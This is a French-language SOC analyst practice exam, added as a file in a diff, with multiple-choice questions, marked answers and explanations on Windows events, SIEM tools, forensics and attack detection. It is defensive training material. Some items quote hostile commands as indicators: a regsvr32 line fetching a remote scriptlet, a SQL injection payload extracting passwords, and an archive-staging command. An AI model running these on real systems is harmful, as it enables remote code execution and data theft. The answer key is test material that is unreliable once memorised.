@@ -1,0 +1,401 @@
+# SIMULATION D'EXAMEN – 50 QUESTIONS
+
+## F|Endpoint Security / Gestion des comptes
+Quel Event ID Windows indique la création d'un nouveau compte utilisateur ?
++ 4720.
+- 4625.
+- 4769.
+- 7045.
+> L'Event ID 4720 (« A user account was created ») permet de détecter la création de comptes, technique de persistance (T1136). Il faut vérifier qui a créé le compte, depuis quel hôte et si la création suit le processus d'approvisionnement normal. 4625 est un échec de connexion, 4769 une demande de ticket de service Kerberos et 7045 une installation de service.
+
+## F|Endpoint Security / Verrouillage
+Quel Event ID, enregistré sur le contrôleur de domaine, signale le verrouillage d'un compte utilisateur ?
++ 4740.
+- 4624.
+- 1102.
+- 4688.
+> L'Event ID 4740 (« A user account was locked out ») indique le nom du compte et l'ordinateur à l'origine des échecs (Caller Computer Name). Une vague de verrouillages peut révéler un brute force, mais aussi un ancien mot de passe enregistré sur un appareil.
+
+## F|Network Security Monitoring / Ports
+Quel port est utilisé par défaut par LDAP sécurisé par TLS (LDAPS) ?
++ TCP 636.
+- TCP 389.
+- TCP 88.
+- TCP 445.
+> LDAPS utilise TCP 636, LDAP en clair TCP/UDP 389, Kerberos le port 88 et SMB le port 445. La connaissance des ports associés aux services d'annuaire aide à interpréter les flux vers les contrôleurs de domaine.
+
+## F|Attack Techniques / Messagerie
+Quel est le rôle de l'enregistrement SPF d'un domaine ?
++ Indiquer quels serveurs sont autorisés à envoyer des e-mails pour ce domaine.
+- Signer cryptographiquement le contenu et les en-têtes des e-mails sortants du domaine.
+- Chiffrer les e-mails de bout en bout.
+- Définir le serveur de messagerie qui reçoit les e-mails du domaine.
+> SPF (Sender Policy Framework), publié dans un enregistrement TXT, liste les IP ou serveurs autorisés à émettre pour le domaine de l'enveloppe (MAIL FROM). DKIM signe les messages, DMARC définit la politique d'alignement et l'enregistrement MX désigne les serveurs de réception.
+
+## F|SOC Fundamentals / Triade CIA
+Une attaque DDoS rendant le site web de l'entreprise inaccessible porte principalement atteinte à quel critère de sécurité ?
++ La disponibilité.
+- La confidentialité.
+- L'intégrité.
+- La non-répudiation.
+> Le déni de service vise à empêcher l'accès légitime à un service : c'est une atteinte à la disponibilité. Une fuite de données touche la confidentialité et une modification non autorisée l'intégrité.
+
+## F|Threat Intelligence / Honeypot
+Quel est l'objectif d'un honeypot déployé dans le réseau interne ?
++ Attirer et détecter les attaquants, car toute interaction avec ce leurre est par nature suspecte.
+- Accélérer la navigation web des utilisateurs.
+- Remplacer l'IDS en bloquant automatiquement toutes les IP qui scannent le réseau interne.
+- Remplacer le pare-feu périmétrique.
+> Un honeypot n'a aucun usage légitime : toute connexion constitue un signal de haute fidélité (scan, mouvement latéral). Il permet aussi d'étudier les techniques de l'attaquant. Il doit être isolé pour ne pas servir de point de rebond.
+
+## F|Malware Analysis / Sandbox
+Qu'est-ce qu'une sandbox dans le contexte de l'analyse de malware ?
++ Un environnement isolé et instrumenté où exécuter un fichier suspect pour observer son comportement.
+- Un serveur de fichiers isolé sur lequel les analystes stockent les échantillons de malwares chiffrés en attente d'analyse statique.
+- Un outil de chiffrement de disque.
+- Un pare-feu applicatif.
+> Une sandbox (ex. Any.Run, Joe Sandbox, Cuckoo/CAPE) exécute l'échantillon et enregistre ses actions : processus, fichiers, registre, réseau. Certains malwares détectent les environnements virtualisés et modifient leur comportement, ce qui impose une interprétation prudente.
+
+## F|Threat Intelligence / MITRE ATT&CK
+Dans MITRE ATT&CK, que représente une « tactique » ?
++ L'objectif de l'attaquant à une étape de l'attaque (le « pourquoi »), comme la persistance ou l'exfiltration.
+- La manière précise dont l'attaquant atteint un objectif, comme l'utilisation de PowerShell ou d'une tâche planifiée.
+- Un identifiant de vulnérabilité.
+- Une adresse IP malveillante.
+> Les tactiques (TA00xx) décrivent les objectifs, les techniques (Txxxx) la manière de les atteindre (le « comment ») et les sous-techniques un niveau de détail supplémentaire. Les procédures décrivent les mises en œuvre concrètes observées chez des acteurs.
+
+## F|SOC Fundamentals / SOC Manager
+Quelle responsabilité incombe principalement au SOC Manager ?
++ Piloter l'équipe, les processus, les indicateurs de performance et la relation avec la direction et les métiers.
+- Traiter les incidents techniques les plus complexes, réaliser l'analyse de malware et le reverse engineering pour l'équipe.
+- Développer les malwares de test.
+- Installer physiquement les capteurs réseau.
+> Le SOC Manager gère les ressources humaines (planning, recrutement, formation), les processus, le reporting, le budget, et représente le SOC auprès du RSSI et de la direction. Il intervient aussi dans la coordination des incidents majeurs.
+
+## F|SIEM / Parsing
+En gestion des journaux, que désigne le parsing ?
++ L'extraction de champs structurés (date, IP, utilisateur) depuis le message brut.
+- La suppression des journaux expirés.
+- La compression et l'indexation des journaux avant archivage dans le stockage froid du SIEM.
+- La duplication des journaux vers un second SIEM.
+> Le parsing découpe un message brut en champs structurés exploitables. Sans parsing correct, les recherches, les règles de corrélation et les tableaux de bord ne fonctionnent pas. Il précède généralement la normalisation vers un schéma commun.
+
+## F|Digital Forensics / Intégrité
+Pourquoi calcule-t-on le hash SHA-256 d'une image disque au moment de son acquisition ?
++ Pour pouvoir prouver ultérieurement que l'image n'a pas été modifiée.
+- Pour compresser l'image disque.
+- Pour chiffrer l'image et empêcher sa lecture par une personne non autorisée.
+- Pour accélérer l'analyse de l'image.
+> Le hash est une empreinte unique : toute modification d'un seul bit produit un hash différent. Le comparer à chaque étape de la chaîne de possession démontre l'intégrité de la preuve. L'acquisition se fait idéalement avec un bloqueur d'écriture.
+
+## F|Vulnerability Management / Zero-day
+Qu'est-ce qu'une vulnérabilité zero-day ?
++ Une vulnérabilité inconnue de l'éditeur ou pour laquelle aucun correctif n'est encore disponible au moment de son exploitation.
+- Une vulnérabilité découverte le jour même par un scanner interne et corrigée dans la journée grâce au processus de gestion des correctifs.
+- Une vulnérabilité ayant un score CVSS de 0.
+- Une vulnérabilité qui n'affecte que les systèmes éteints.
+> Une zero-day est exploitée avant qu'un correctif ne soit disponible. Les détections comportementales et les mesures de défense en profondeur sont alors essentielles, car les signatures et la gestion des correctifs ne protègent pas encore.
+
+## F|SOC Fundamentals / Moindre privilège
+Quel principe consiste à n'accorder aux utilisateurs que les droits strictement nécessaires à leurs missions ?
++ Le principe du moindre privilège.
+- Le principe de la défense en profondeur.
+- Le principe de la séparation des réseaux.
+- Le principe de la non-répudiation.
+> Le moindre privilège limite l'impact d'une compromission de compte. Il se met en œuvre par des rôles adaptés, la suppression des droits administrateurs locaux, l'accès just-in-time (PIM) et des revues régulières des habilitations.
+
+## F|SIEM / QRadar
+Dans IBM QRadar, que signifie l'indicateur EPS, souvent utilisé pour le dimensionnement et les licences ?
++ Events Per Second : le nombre d'événements traités par seconde.
+- Event Processing Score : la qualité moyenne du parsing.
+- Encrypted Packet Stream.
+- Error Priority Score.
+> L'EPS mesure le débit d'événements ingérés. Il sert au dimensionnement de l'infrastructure et à la licence QRadar, avec les FPM (Flows Per Minute) pour les flux réseau. Un dépassement peut entraîner la mise en file d'attente ou la perte d'événements.
+
+## F|Endpoint Security / Groupes privilégiés
+Quel Event ID indique qu'un membre a été ajouté à un groupe de sécurité global, comme « Domain Admins » ?
++ 4728.
+- 4740.
+- 4634.
+- 4776.
+> L'Event ID 4728 trace l'ajout à un groupe global de sécurité (4732 pour un groupe local, 4756 pour un groupe universel). L'ajout d'un compte aux groupes à privilèges doit générer une alerte immédiate, car c'est une technique fréquente d'élévation et de persistance (T1098).
+
+## I|Endpoint Security / Tâches planifiées
+Quel Event ID du journal Security signale la création d'une tâche planifiée lorsque l'audit des objets est activé ?
++ 4698.
+- 4720.
+- 4771.
+- 5140.
+> L'Event ID 4698 (« A scheduled task was created ») contient le XML de la tâche, notamment la commande exécutée et le déclencheur. 4699 indique une suppression et 4702 une modification. 5140 trace l'accès à un partage réseau.
+
+## I|Endpoint Security / Sysmon DNS
+Un analyste veut savoir quel processus a résolu un domaine C2 sur un poste. Quel événement Sysmon fournit cette information ?
++ Event ID 22 (DNSEvent), qui associe la requête DNS au processus émetteur.
+- Event ID 1 (Process Create).
+- Event ID 11 (FileCreate), qui enregistre chaque mise à jour du cache DNS local par le processus.
+- Event ID 5 (Process Terminated).
+> Les journaux du serveur DNS montrent l'hôte, mais pas le processus. Sysmon 22 enregistre la requête, le résultat et l'image du processus, ce qui permet d'identifier immédiatement l'exécutable malveillant à l'origine de la résolution.
+
+## I|SIEM / Automation rules Sentinel
+Dans Microsoft Sentinel, quel est le rôle des règles d'automatisation (automation rules) ?
++ Automatiser le tri des incidents : attribution, statut, sévérité, tags et lancement de playbooks.
+- Exécuter des requêtes KQL planifiées sur les journaux pour générer des alertes, en remplacement des règles d'analyse.
+- Écrire les requêtes KQL des règles d'analyse.
+- Stocker les indicateurs de compromission.
+> Les automation rules s'exécutent lors de la création ou de la mise à jour d'incidents et peuvent appeler des playbooks Logic Apps. Elles permettent par exemple de fermer automatiquement des faux positifs connus ou d'assigner les incidents critiques à une équipe.
+
+## I|SIEM / Règles NRT
+Quand privilégier une règle NRT (Near-Real-Time) dans Microsoft Sentinel plutôt qu'une règle planifiée ?
++ Pour des détections critiques et simples à déclencher au plus vite (exécution environ chaque minute).
+- Pour des corrélations complexes sur 14 jours de données avec de nombreuses jointures, car les règles NRT ne sont soumises à aucune limitation.
+- Pour générer des rapports mensuels destinés à la direction.
+- Pour importer des flux de threat intelligence.
+> Les règles NRT s'exécutent environ chaque minute et sont adaptées aux événements à haut risque (ajout à un rôle privilégié, connexion d'un compte break-glass). Elles comportent des limitations par rapport aux règles planifiées, qui restent adaptées aux corrélations sur de longues périodes.
+
+## I|SIEM / Splunk data models
+Pourquoi utiliser la commande tstats sur des data models accélérés dans Splunk Enterprise Security ?
++ Pour interroger des résumés indexés pré-calculés, ce qui accélère fortement les recherches sur de grands volumes normalisés selon le CIM.
+- Pour forcer une recherche en temps réel sur les données brutes non indexées, ce qui garantit des résultats plus complets qu'une recherche classique.
+- Pour transférer les journaux vers un autre SIEM.
+- Pour chiffrer les résultats des recherches.
+> tstats exploite les données tsidx des data models accélérés. Les recherches de corrélation d'Enterprise Security reposent largement sur ce mécanisme, ce qui suppose que les données soient correctement mappées sur le CIM.
+
+## I|Network Security Monitoring / Wireshark TLS
+Quel filtre Wireshark permet d'afficher les Client Hello TLS indiquant un nom de serveur spécifique ?
++ tls.handshake.extensions_server_name == "exemple.com"
+- http.host == "exemple.com" sur une session TLS chiffrée.
+- dns.a == "exemple.com"
+- tcp.flags.reset == 1
+> Le SNI (Server Name Indication) est transmis en clair dans le Client Hello, y compris en TLS 1.3 sans ECH. Le filtre tls.handshake.extensions_server_name permet d'identifier les destinations HTTPS sans déchiffrement. L'en-tête HTTP Host n'est pas visible dans une session chiffrée.
+
+## I|Attack Techniques / Mimikatz
+Quelle mesure de protection native de Windows empêche Mimikatz (sekurlsa::logonpasswords) d'extraire les secrets NTLM et Kerberos depuis LSASS ?
++ Credential Guard, qui isole ces secrets grâce à la virtualisation (VBS).
+- Le Script Block Logging de PowerShell, qui empêche l'exécution de Mimikatz en mémoire.
+- Le changement du fond d'écran par GPO.
+- L'activation du protocole SMBv1.
+> Credential Guard utilise la sécurité basée sur la virtualisation (VBS) pour isoler les secrets dans le processus LSAIso. La protection LSA (RunAsPPL) complète ce dispositif en empêchant les processus non protégés d'accéder à LSASS.
+
+## I|Endpoint Security / Regsvr32
+Un analyste observe : regsvr32.exe /s /n /u /i:http://203.0.113.9/file.sct scrobj.dll. De quelle technique s'agit-il ?
++ Une exécution par proxy d'un binaire système signé (Squiblydoo, T1218.010) pour charger un scriptlet distant en contournant le contrôle applicatif.
+- Un enregistrement légitime d'un composant COM Microsoft, la commande téléchargeant la dernière version du fichier scrobj.dll depuis un serveur de mise à jour.
+- Une mise à jour du catalogue de pilotes.
+- Une désinstallation de Microsoft Office.
+> Regsvr32 peut charger un scriptlet COM (.sct) distant via scrobj.dll. Cette technique contourne certaines politiques AppLocker, car le binaire est signé par Microsoft. Une ligne de commande contenant /i:http est un indicateur à haute fidélité.
+
+## I|Endpoint Security / MSHTA
+L'EDR signale mshta.exe lancé par explorer.exe avec une URL distante en argument, suivi d'une connexion réseau sortante. Quelle est la meilleure interprétation ?
++ Une exécution probable d'une application HTA malveillante via un binaire système (T1218.005), souvent liée à un lien de phishing ou à un fichier LNK.
+- Une mise à jour normale du moteur HTML d'Internet Explorer, déclenchée par l'utilisateur depuis l'explorateur de fichiers lors de l'ouverture d'une page.
+- Une synchronisation OneDrive.
+- Un processus d'impression réseau.
+> Mshta exécute des fichiers HTML Application pouvant contenir du VBScript ou du JScript. Son utilisation avec une URL distante est rarement légitime dans un environnement d'entreprise. L'analyse du fichier HTA et de la chaîne d'exécution est nécessaire.
+
+## I|Attack Techniques / BEC
+Un e-mail semblant provenir du directeur financier demande un virement urgent ; le champ Reply-To pointe vers une adresse externe différente. Quelle menace est la plus probable ?
++ Une fraude de type Business Email Compromise (BEC) par usurpation ou compte compromis.
+- Une campagne de spam publicitaire, car l'absence de pièce jointe et de lien exclut toute tentative de fraude.
+- Une notification légitime du service de messagerie.
+- Une attaque par déni de service.
+> Le BEC exploite l'ingénierie sociale pour obtenir des virements frauduleux, souvent sans pièce jointe ni lien. La divergence entre l'expéditeur affiché et le Reply-To, l'urgence et la demande financière sont des signaux classiques. Une vérification par un canal indépendant est indispensable.
+
+## I|Cloud Security / Règles de boîte aux lettres
+Après la compromission d'un compte Microsoft 365, quel artefact l'analyste doit-il vérifier en priorité dans le journal d'audit (OfficeActivity) ?
++ La création de règles de boîte de réception (New-InboxRule, Set-InboxRule) transférant ou supprimant des e-mails.
+- La modification de la photo de profil, de la signature et de la langue de l'interface, qui révèle une prise de contrôle du compte.
+- La taille de la boîte aux lettres.
+- La langue de l'interface Outlook.
+> Les attaquants créent des règles pour transférer les e-mails vers l'extérieur ou masquer les réponses (T1114.003, T1564.008). Ces règles permettent la persistance de l'espionnage et la fraude BEC même après réinitialisation du mot de passe.
+
+## I|Endpoint Security / Linux SSH
+Sur un serveur Linux Debian/Ubuntu, quel fichier consulter pour analyser les tentatives de connexion SSH échouées ?
++ /var/log/auth.log
+- /var/log/dpkg.log
+- /etc/hosts
+- /var/log/apt/history.log
+> Sur les distributions Debian/Ubuntu, les authentifications sont journalisées dans /var/log/auth.log (sur RHEL/CentOS, /var/log/secure). Des messages « Failed password for invalid user » répétés indiquent un brute force SSH. Avec systemd, journalctl -u ssh fournit aussi ces informations.
+
+## I|Endpoint Security / Persistance Linux
+Lors de l'investigation d'un serveur Linux compromis, quels emplacements vérifier en priorité pour la persistance ?
++ Les crontabs, les services systemd, le fichier ~/.ssh/authorized_keys et les scripts de démarrage du shell (.bashrc).
+- Uniquement le répertoire /tmp.
+- Le fichier /etc/hostname.
+- Les journaux du serveur d'impression CUPS et le fichier /etc/hostname, qui contient la liste des services lancés au démarrage.
+> Les mécanismes de persistance Linux courants incluent cron (T1053.003), les services systemd (T1543.002), l'ajout de clés SSH (T1098.004) et la modification des fichiers d'initialisation du shell (T1546.004). Les dates de modification et le contenu de ces fichiers doivent être comparés à une référence.
+
+## I|Endpoint Security / Identifiants explicites
+Que signale l'Event ID 4648 ?
++ Une connexion avec des identifiants explicites (ex. runas ou accès distant sous un autre compte).
+- Une ouverture de session réussie avec un logon type 10 (RemoteInteractive) sur le serveur cible.
+- L'effacement du journal de sécurité.
+- La modification de la politique d'audit.
+> L'Event ID 4648 est généré sur la machine source lorsqu'un processus utilise des identifiants différents de ceux de la session. Il est utile pour détecter le mouvement latéral et l'usage d'identifiants volés, en identifiant le compte cible et le serveur visé.
+
+## I|Threat Hunting / Honeytokens
+Le SOC crée dans l'AD un compte « svc_backup_admin » jamais utilisé, avec un SPN fictif. Quel est l'objectif ?
++ Servir de honeytoken : toute demande de ticket sur ce compte trahit une reconnaissance ou un Kerberoasting.
+- Sauvegarder automatiquement les contrôleurs de domaine.
+- Servir de compte de service dédié aux sauvegardes AD, dont le SPN permet l'authentification Kerberos des agents de sauvegarde.
+- Accélérer la réplication Active Directory.
+> Un compte leurre n'a aucun usage légitime : un événement 4769 le concernant ou une tentative de connexion constitue une alerte quasi exempte de faux positifs. Les honeytokens (comptes, fichiers, clés API) sont des détections à très faible coût.
+
+## I|Threat Intelligence / Analyse d'URL
+Un analyste souhaite examiner une URL suspecte sans la visiter depuis son poste. Quel service est adapté ?
++ urlscan.io, qui visite l'URL et fournit captures d'écran, requêtes, redirections et indicateurs associés.
+- Hashcat.
+- Nmap avec les options -sV et --script http-title, lancé depuis le poste de l'analyste vers l'hôte de l'URL.
+- Le Gestionnaire des tâches de Windows.
+> urlscan.io (ou une sandbox navigateur) analyse une page à distance : contenu, ressources chargées, domaines contactés, certificats. Attention : les scans publics sont visibles par tous ; il faut utiliser le mode privé pour les URL sensibles contenant des identifiants ou des jetons.
+
+## I|Incident Response / Corrélation IP-hôte
+Une alerte de proxy mentionne l'IP interne 10.20.30.45 il y a trois jours. Quelle source permet de déterminer avec certitude quel poste utilisait cette IP à ce moment ?
++ Les journaux DHCP (baux attribués), corrélés avec les journaux d'authentification ou l'inventaire EDR.
+- La table ARP actuelle du commutateur, croisée avec le résultat d'un ping lancé aujourd'hui vers l'adresse IP.
+- Le résultat d'un ping lancé aujourd'hui.
+- Le fichier hosts du poste de l'analyste.
+> Dans un réseau DHCP, une IP peut être réattribuée. Seuls les journaux de baux horodatés permettent d'associer l'IP au poste (adresse MAC, nom d'hôte) à l'instant de l'alerte. Les informations actuelles peuvent conduire à investiguer le mauvais poste.
+
+## I|Incident Response / Menace interne
+Un employé démissionnaire copie 12 Go de fichiers clients sur une clé USB la veille de son départ. Quelles sources permettent de confirmer et documenter les faits ?
++ Les journaux DLP et EDR (USB, fichiers), corrélés avec les accès aux partages de fichiers.
+- Les journaux du serveur DNS et du proxy web, qui enregistrent les transferts de fichiers vers les périphériques amovibles.
+- Les journaux de l'imprimante réseau uniquement.
+- L'historique des mises à jour Windows.
+> Les solutions DLP et EDR tracent le branchement de périphériques USB et les copies de fichiers. Les journaux d'accès aux fichiers (Event ID 5145 pour les partages, audit SharePoint) complètent la chronologie. Ces investigations impliquent les RH et le juridique et doivent respecter le cadre légal.
+
+## I|Incident Response / Defender AIR
+Quel est le rôle de l'investigation et réponse automatisées (AIR) de Microsoft Defender XDR ?
++ Examiner automatiquement alertes et entités, puis proposer ou appliquer la remédiation selon la configuration.
+- Rédiger automatiquement les rapports destinés à la direction générale.
+- Remplacer le SIEM pour la conservation des journaux et la corrélation des alertes de toutes les sources de l'entreprise, y compris les pare-feux.
+- Désactiver l'antivirus pendant l'investigation.
+> AIR analyse les preuves (fichiers, processus, e-mails, persistance) et détermine un verdict. Selon le niveau d'automatisation, les remédiations sont appliquées automatiquement ou attendent une approbation dans l'Action center, ce qui réduit la charge des analystes.
+
+## I|Threat Intelligence / Sinkhole
+Que signifie le sinkholing d'un domaine malveillant ?
++ Rediriger la résolution du domaine vers un serveur contrôlé par les défenseurs afin de neutraliser le C2 et d'identifier les machines infectées.
+- Supprimer définitivement le domaine de tous les serveurs DNS du monde.
+- Chiffrer le trafic vers le domaine malveillant et le rediriger vers un proxy d'inspection TLS afin d'analyser les commandes envoyées par le C2.
+- Bloquer tout le trafic DNS de l'entreprise.
+> Le sinkhole peut être interne (DNS d'entreprise renvoyant une IP contrôlée) ou mené par des chercheurs et les autorités. Les postes qui contactent l'IP du sinkhole sont identifiés comme infectés. Il est aussi utilisé contre les malwares à DGA.
+
+## I|Vulnerability Management / Vecteur CVSS
+Dans un vecteur CVSS v3.1, que signifient les métriques AV:N/PR:N/UI:N ?
++ La vulnérabilité est exploitable à distance par le réseau, sans privilège préalable et sans interaction de l'utilisateur.
+- La vulnérabilité nécessite un accès physique, des privilèges élevés et une interaction de l'utilisateur.
+- La vulnérabilité est exploitable par le réseau, mais nécessite des privilèges élevés préalables et une action de l'utilisateur ciblé.
+- La vulnérabilité ne concerne que les réseaux locaux sans fil.
+> AV (Attack Vector) : N pour Network ; PR (Privileges Required) : N pour None ; UI (User Interaction) : N pour None. Cette combinaison caractérise les vulnérabilités les plus dangereuses, souvent exploitables par des vers ou des scans de masse.
+
+## I|Attack Techniques / Watering hole
+Des employés d'un même secteur sont infectés après avoir visité le site légitime d'une association professionnelle compromise. Quelle technique est utilisée ?
++ Une attaque de point d'eau (watering hole).
+- Une attaque par force brute sur les comptes du site.
+- Une attaque de type MFA fatigue.
+- Un ARP spoofing.
+> L'attaquant compromet un site fréquenté par ses cibles pour y injecter du code malveillant (exploit de navigateur, faux téléchargement). La détection repose sur les journaux proxy, la télémétrie EDR du navigateur et le partage de renseignements sectoriels.
+
+## A|Attack Techniques / WMI à distance
+Sur un serveur, l'EDR montre wmiprvse.exe lançant powershell.exe avec une commande encodée, peu après un logon type 3 d'un compte administrateur depuis un autre poste. Quelle conclusion est la plus pertinente ?
++ Une exécution à distance via WMI (T1047), par exemple avec wmic /node: process call create, utilisée pour le mouvement latéral.
+- Une mise à jour automatique de Windows Defender.
+- Une tâche planifiée locale créée par l'utilisateur du serveur, exécutée par WmiPrvSE.exe qui est le planificateur de tâches de Windows.
+- Un fonctionnement normal du service d'impression.
+> Lorsque WMI est utilisé à distance, la commande s'exécute comme processus enfant de WmiPrvSE.exe sur la cible. Combiné à une authentification réseau préalable et à un PowerShell encodé, cela caractérise un mouvement latéral. Il faut analyser le poste source, qui détient probablement des identifiants compromis.
+
+## A|Attack Techniques / WinRM
+Quel processus parent, sur la machine cible, indique l'exécution de commandes via PowerShell Remoting (WinRM) ?
++ wsmprovhost.exe.
+- spoolsv.exe.
+- lsass.exe.
+- dwm.exe.
+> Les sessions PowerShell Remoting sont hébergées par wsmprovhost.exe sur la cible, avec une connexion entrante sur les ports 5985 (HTTP) ou 5986 (HTTPS). Des processus enfants inhabituels de wsmprovhost.exe et des événements du journal Microsoft-Windows-WinRM/Operational signalent un usage à investiguer (T1021.006).
+
+## A|Digital Forensics / Timestomping
+Lors de l'analyse de la MFT NTFS, un fichier présente une date de création $STANDARD_INFORMATION en 2019, mais une date $FILE_NAME de la semaine dernière. Que suspecter ?
++ Un timestomping : l'attaquant a modifié les horodatages $SI pour faire paraître le fichier ancien.
+- Un comportement normal lors de la copie d'un fichier.
+- Un comportement normal : $FILE_NAME est mis à jour à chaque lecture du fichier, alors que $STANDARD_INFORMATION reste figé.
+- Un fichier système Windows d'origine.
+> Les horodatages $SI sont modifiables via les API utilisateur, alors que les attributs $FILE_NAME le sont beaucoup plus difficilement. Une incohérence où $SI est antérieur à $FN est un indicateur classique de timestomping (T1070.006). Le journal USN et la timeline globale aident à confirmer.
+
+## A|Attack Techniques / Injection SQL
+Les journaux d'un serveur web montrent des requêtes avec « UNION SELECT username,password FROM users-- » sur un paramètre id, avec des codes 200 et des tailles de réponse nettement supérieures à la normale. Quelle conclusion est la plus solide ?
++ Une injection SQL probablement réussie, à confirmer côté base de données et à traiter comme une fuite.
+- Une simple tentative bloquée, car le code 200 signifie que le WAF a filtré la requête.
+- Un crawler de moteur de recherche légitime qui teste automatiquement la robustesse des paramètres d'URL indexés.
+- Une erreur de configuration du DNS.
+> Le code 200 indique que l'application a traité la requête ; une taille de réponse anormale suggère que des données supplémentaires ont été renvoyées. Il faut confirmer avec les journaux applicatifs et SQL, identifier les données exposées, corriger le code (requêtes paramétrées) et évaluer les obligations de notification.
+
+## A|Threat Hunting / Supply chain
+Une mise à jour signée d'un logiciel de supervision légitime se met à contacter un domaine inconnu après une période de dormance de deux semaines. Quelle approche de détection est la plus efficace dans ce type d'attaque de la chaîne d'approvisionnement ?
++ La détection comportementale : nouvelles destinations, processus enfants inhabituels, écarts à la baseline.
+- La vérification de la signature numérique, qui garantit l'absence de malveillance.
+- Le blocage des seules adresses IP déjà connues dans les flux CTI.
+- La comparaison du hash de la mise à jour avec celui publié sur le site de l'éditeur, qui suffit à exclure toute compromission de la chaîne d'approvisionnement.
+> Dans une compromission de la chaîne d'approvisionnement (T1195.002), le code malveillant est signé par l'éditeur légitime. Seule l'analyse comportementale par rapport à une baseline permet de repérer l'anomalie. Le cas SUNBURST a montré l'importance de surveiller les communications des outils d'administration.
+
+## A|Endpoint Security / Named pipes
+Sysmon Event ID 17 montre la création d'un named pipe nommé \MSSE-1234-server par un processus lancé depuis un répertoire temporaire. Quelle hypothèse privilégier ?
++ L'utilisation probable d'une balise Cobalt Strike avec une configuration par défaut, ce nom de pipe faisant partie de ses artefacts connus.
+- Une communication normale de l'antivirus Microsoft Security Essentials, dont le service crée ce pipe pour échanger avec son moteur d'analyse temporaire.
+- Une impression réseau via SMB.
+- Une session RDP légitime.
+> Les Event IDs Sysmon 17 et 18 tracent la création et la connexion aux named pipes. Cobalt Strike utilise par défaut des noms caractéristiques (ex. MSSE-<nombre>-server). Les attaquants avancés les modifient, mais la combinaison avec un processus lancé depuis un répertoire temporaire reste un indicateur fort.
+
+## A|Detection Engineering / Performance KQL
+Pourquoi recommande-t-on d'utiliser l'opérateur has plutôt que contains dans les requêtes KQL de Microsoft Sentinel lorsque c'est possible ?
++ Parce que has s'appuie sur l'index des termes entiers, bien plus rapide que la recherche de sous-chaînes.
+- Parce que contains est sensible à la casse et ne fonctionne que sur les colonnes de type dynamic, alors que has s'applique à toutes les colonnes.
+- Parce que has est insensible au temps de rétention.
+- Parce que contains modifie les données sources.
+> L'opérateur has exploite l'indexation par termes (tokens d'au moins trois caractères), alors que contains analyse les sous-chaînes. Pour des requêtes exécutées fréquemment ou sur de gros volumes, ce choix améliore nettement les performances, à condition que la recherche porte sur des termes complets.
+
+## A|Attack Techniques / Kerberos
+Le contrôleur de domaine enregistre de nombreux événements 4771 avec le code d'échec 0x18 pour des centaines de comptes différents depuis un même poste, en quelques minutes. Que conclure ?
++ Un password spraying via Kerberos (échecs de pré-authentification dus à de mauvais mots de passe), qui ne génère pas nécessairement d'événements 4625.
+- Une désynchronisation horaire entre le poste et le contrôleur de domaine, le code 0x18 signalant un décalage d'horloge supérieur à cinq minutes.
+- Une réplication AD défaillante.
+- Une attaque DCSync.
+> Le code 0x18 de l'événement 4771 signifie « mot de passe incorrect » lors de la pré-authentification Kerberos. Des outils comme Kerbrute utilisent cette méthode. Une surveillance limitée aux 4625 manquerait ce spraying ; il faut agréger les 4771 par source.
+
+## A|Attack Techniques / AS-REP Roasting
+Un analyste découvre des événements 4768 avec un type de pré-authentification égal à 0 pour plusieurs comptes. Quelle attaque cela peut-il révéler et quelle remédiation appliquer ?
++ Un AS-REP Roasting ; il faut réactiver la pré-authentification Kerberos et renforcer ces mots de passe.
+- Un Golden Ticket forgé sans pré-authentification ; il faut supprimer puis recréer le compte KRBTGT et redémarrer tous les contrôleurs de domaine.
+- Un DCSync ; il faut désactiver la réplication AD.
+- Un pass-the-hash ; il faut désactiver Kerberos.
+> Lorsque l'option « Do not require Kerberos preauthentication » est activée, un attaquant peut obtenir une réponse AS-REP chiffrée avec la clé dérivée du mot de passe et la casser hors ligne (T1558.004). L'inventaire de ces comptes et la suppression de l'option sont les principales remédiations.
+
+## A|Cloud Security / AWS root
+CloudTrail enregistre un événement ConsoleLogin réussi du compte root AWS à 3 h du matin, depuis une IP inconnue, suivi de la création d'utilisateurs IAM. Quelle évaluation est la plus juste ?
++ Un incident critique : usage anormal du root et persistance probable via IAM ; confinement immédiat.
+- Une activité normale de maintenance d'AWS, dont les équipes utilisent le compte root de chaque client pour appliquer les correctifs de la plateforme.
+- Un faux positif lié au fuseau horaire.
+- Un événement informatif sans action requise.
+> Les bonnes pratiques AWS réservent le compte root à de rares tâches et exigent le MFA. Une connexion inattendue suivie de la création d'identités (T1136.003) indique une compromission grave. Il faut sécuriser le root (mot de passe, MFA), supprimer les identités créées et examiner toutes les actions CloudTrail.
+
+## A|Network Security Monitoring / DNS chiffré
+Le SOC constate que plusieurs postes n'émettent plus de requêtes vers les serveurs DNS internes, mais établissent des connexions HTTPS vers des résolveurs publics (ex. sur le port 443). Quel risque cela représente-t-il ?
++ Le DoH contourne la surveillance et le filtrage DNS internes, et peut masquer des communications C2.
+- Aucun risque : le chiffrement des requêtes DNS améliore la confidentialité et les résolveurs publics filtrent eux-mêmes les domaines malveillants.
+- Une amélioration de la visibilité du SOC.
+- Une simple mise à jour des certificats racine.
+> Le DoH encapsule les requêtes DNS dans HTTPS, ce qui les rend invisibles aux journaux DNS internes et aux protections de type DNS firewall. Les politiques d'entreprise désactivent généralement le DoH non autorisé dans les navigateurs et bloquent les résolveurs DoH publics connus.
+
+## A|Incident Response / Préparation de l'exfiltration
+L'EDR détecte l'exécution de rar.exe a -hp[motdepasse] C:\Users\Public\data.rar sur un serveur de fichiers, avec des centaines de fichiers de projets. Quelle tactique est observée et quelle action prioriser ?
++ La préparation d'une exfiltration (T1560.001) ; surveiller les flux sortants et identifier le compte utilisé.
+- Une sauvegarde légitime réalisée par l'administrateur ; l'option -hp prouve qu'il s'agit d'une procédure approuvée de protection des données sensibles.
+- Une attaque DDoS en cours ; il faut contacter le fournisseur d'accès.
+- Une mise à jour logicielle ; il faut redémarrer le serveur.
+> L'archivage chiffré de données dans un répertoire public est un indicateur de « staging » avant exfiltration (Collection, TA0009). L'option -hp chiffre aussi les noms de fichiers. Intervenir à ce stade peut empêcher la fuite : surveillance réseau, blocage, investigation du compte utilisé.
+
+## A|Detection Engineering / Purple team
+Lors d'un exercice purple team, la technique T1003.001 est exécutée : l'EDR la bloque, mais aucune alerte n'apparaît dans le SIEM. Quelle est la conclusion la plus pertinente ?
++ Une lacune d'intégration : la télémétrie EDR ne remonte pas au SIEM ; corriger puis retester.
+- L'exercice est réussi : l'EDR ayant bloqué la technique, l'absence d'alerte dans le SIEM est normale et évite de surcharger les analystes.
+- Le SIEM doit être remplacé immédiatement.
+- La technique T1003.001 n'est pas pertinente pour l'organisation.
